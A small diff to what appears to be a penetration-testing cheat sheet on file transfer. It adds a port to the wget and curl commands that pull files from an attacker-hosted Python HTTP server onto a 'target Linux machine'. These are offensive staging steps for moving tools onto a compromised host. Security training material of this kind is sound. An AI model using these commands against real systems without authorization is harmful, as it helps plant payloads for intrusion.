@@ -20,12 +20,12 @@ python3 -m http.server <LOCAL_PORT>
 
 ```console
 # In target Linux machine
-wget <LOCAL_IP>/<FILE>
+wget <LOCAL_IP>:<LOCAL_PORT>/<FILE>
 ```
 
 ```console
 # In target Linux machine
-curl <LOCAL_IP>/<FILE> -o <REMOTE_DEST_PATH>
+curl <LOCAL_IP>:<LOCAL_PORT>/<FILE> -o <REMOTE_DEST_PATH>
 ```
 
 </div>
